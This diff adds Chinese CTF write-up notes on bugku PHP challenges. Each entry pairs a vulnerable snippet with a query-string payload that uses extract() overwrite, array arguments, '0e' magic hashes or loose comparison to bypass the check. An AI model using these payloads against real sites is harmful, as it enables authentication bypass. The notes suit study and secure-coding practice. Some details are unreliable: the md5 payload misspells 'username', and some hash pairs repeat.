@@ -1197,6 +1197,250 @@ print(l)
 
 https://bbs.ichunqiu.com/thread-16297-1-1.html
 
+## extract在变量中（bugku）
+```
+<?php
+$flag='xxx';
+extract($_GET);
+if(isset($shiyan))
+{
+$content=trim(file_get_contents($flag));
+if($shiyan==$content)
+{
+echo'flag{xxx}';
+}
+else
+{ echo'Oh.no';}}
+?>
+```
+
+extract()会把符号表中已存在的变量名的值替换掉，将flag变量的值赋给名为content变量，如果变量shiyan和变量content的值相同，就输出flag的值
+
+payload： ?shiyan=&flag=
+
+## strcmp比较字符串（bugku）
+
+```
+<?php
+$flag = "flag{xxxxx}";
+if (isset($_GET['a'])) {
+if (strcmp($_GET['a'], $flag) == 0) //如果 str1 小于 str2 返回 < 0； 如果 str1大于 str2返回 > 0；如果两者相等，返回 0。
+//比较两个字符串（区分大小写）
+die('Flag: '.$flag);
+else
+print 'No';
+}
+?>
+```
+构造数组绕过strcmp比较大小
+
+payload: ?a[]=1
+
+## urldecode二次编码绕过(bugku)
+
+```
+<?php
+if(eregi("hackerDJ",$_GET[id])) {
+    echo("not allowed!");
+    exit();
+}
+$_GET[id] = urldecode($_GET[id]);
+if($_GET[id] == "hackerDJ")
+{
+echo "Access granted!";
+echo "flag";
+}
+?>
+```
+eregi字符串比对解析，与大小写无关。利用两次urldecode第一次是浏览器的解码第二次是函数的解码,
+
+payload: ?id=hacker%2544J
+
+## md5()函数(bugku)
+
+```
+<?php
+error_reporting(0);
+$flag = 'flag{test}';
+if (isset($_GET['username']) and isset($_GET['password'])) {
+if ($_GET['username'] == $_GET['password'])
+    print 'Your password can not be your username.';
+else if (md5($_GET['username']) === md5($_GET['password']))
+    die('Flag: '.$flag);
+else print 'Invalid password';
+}
+?>
+```
+
+利用MD5没有办法处理数组的缺陷，绕过判断
+
+payload: ?uasrname[]=1&password[]=2
+
+## 数组返回NULL绕过(bugku)
+
+```
+<?php
+$flag = "flag";
+
+if (isset ($_GET['password'])) {
+    if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
+    echo 'You password must be alphanumeric';
+    else if (strpos ($_GET['password'], '--') !== FALSE)
+    die('Flag: ' . $flag);
+else
+    echo 'Invalid password';
+}
+?>
+```
+
+利用ereg只能匹配字符，构造数组绕过
+
+payload: ?password[]=1
+
+## 弱类型整数大小比较绕过（bugku）
+
+```
+$temp = $_GET['password'];
+is_numeric($temp)?die("no numeric"):NULL;
+if($temp>1336){
+echo $flag;
+```
+is_numeric用于检测变量是否为数字或数字字符串，不能判断数组，构造数组绕过
+
+Payload: password[]=1
+
+## sha()函数比较绕过(bugku)
+
+```
+<?php
+$flag = "flag";
+if (isset($_GET['name']) and isset($_GET['password']))
+{
+var_dump($_GET['name']);
+echo "";
+var_dump($_GET['password']);
+var_dump(sha1($_GET['name']));
+var_dump(sha1($_GET['password']));
+if ($_GET['name'] == $_GET['password'])
+echo 'Your password can not be your name!';
+else if (sha1($_GET['name']) === sha1($_GET['password']))
+die('Flag: '.$flag);
+else echo 'Invalid password.';
+}
+```
+==弱比较是比较字符，sha1()可以构造数组绕过
+
+payload: ?name[]=1&password[]=2
+
+## md5加密相等绕过(bugku)
+
+```
+<?php
+$md51 = md5('QNKCDZO');
+$a = @$_GET['a'];
+$md52 = @md5($a);
+if(isset($a)){
+if ($a != 'QNKCDZO' && $md51 == $md52) {
+echo "flag{*}";
+} else {
+echo "false!!!";
+}}
+else{echo "please input a";}
+?>
+```
+
+根据MD5的特性，有两点漏洞
+
+1. 两个开头为0的md5值相同。
+2. md5不能处理数组。
+3. PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。
+
+常见0e开头的md5和原值：
+
+QNKCDZO
+0e830400451993494058024219903391
+
+s878926199a
+0e545993274517709034328855841020
+
+s155964671a
+0e342768416822451524974117254469
+
+s214587387a
+0e848240448830537924465865611904
+
+s214587387a
+0e848240448830537924465865611904
+
+s878926199a
+0e545993274517709034328855841020
+
+## 十六进制与数字比较（bugku）
+
+函数要求变量$temp不能存在1~9之间的数字，最后，又要求$temp=3735929054;
+
+这本来是自相矛盾的，但php在转码时会把16进制转化为十进制.于是把
+3735929054转换成16进制为0xdeadc0de，记得带上0x；
+构造payload
+
+?password=0xdeadc0de
+
+## ereg正则%00截断(bugku)
+
+1. ereg() 正则限制了password格式，只能是一个或者多个数字、大小写字母
+2. strpos() 查找某字符串在另一字符串中第一次出现的位置（区分大小写），本题中需要匹配到"*-*"才能输出flag
+
+ereg() 只能处理字符串，而password是数组，所以返回的是null，三个等号的时候不会进行类型转换。所以null!==false。
+
+strpos() 的参数同样不能够是数组，所以返回的依旧是null，null!==false也正确。
+
+Payload：?password[]=1
+
+## strpos数组绕过(bugku)
+
+1. 同前面几题，ereg()只能处理字符串的，遇到数组做参数返回NULL，判断用的是 === ，其要求值与类型都要相同，而NULL跟FALSE类型是不同的,
+2. trpos函数遇到数组，也返回NULL，与FALSE类型不同，if条件成立，输出flag。
+
+payload:?ctf[]=2
+
+## 数字验证正则绕过(bugku)
+
+```
+<?php
+error_reporting(0);
+$flag = 'flag{test}';
+if ("POST" == $_SERVER['REQUEST_METHOD'])
+{
+$password = $_POST['password'];
+if (0 >= preg_match('/^[[:graph:]]{12,}$/', $password)) //preg_match — 执行一个正则表达式匹配  [: graph:] 表示任意一个可打印字符。也就是说，要求$password长度大于12
+{
+echo 'flag';
+exit;
+}
+while (TRUE)
+{
+$reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/';
+//只要匹配到一个标点符号、或者匹配到一个数字、或者一个大写字母、或者一个小写字母，即为匹配成功
+if (6 > preg_match_all($reg, $password, $arr))
+break;
+$c = 0;
+$ps = array('punct', 'digit', 'upper', 'lower'); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母
+foreach ($ps as $pt)
+{
+if (preg_match("/[[:$pt:]]+/", $password))
+$c += 1;
+}
+if ($c < 3) break;
+//>=3，//必须包含四种类型三种与三种以上, $password中包含标点符号、数字、大写字母、小写字母中三种及以上的类型
+if ("42" == $password) echo $flag; //弱类型比较，前两位是数字42的字符串
+else echo 'Wrong password';
+exit;
+}
+}
+```
+
+Payload: ?password=42aaAaa2;aaaa
+
 ## php_rce（攻防世界）
 
 phpthink5漏洞
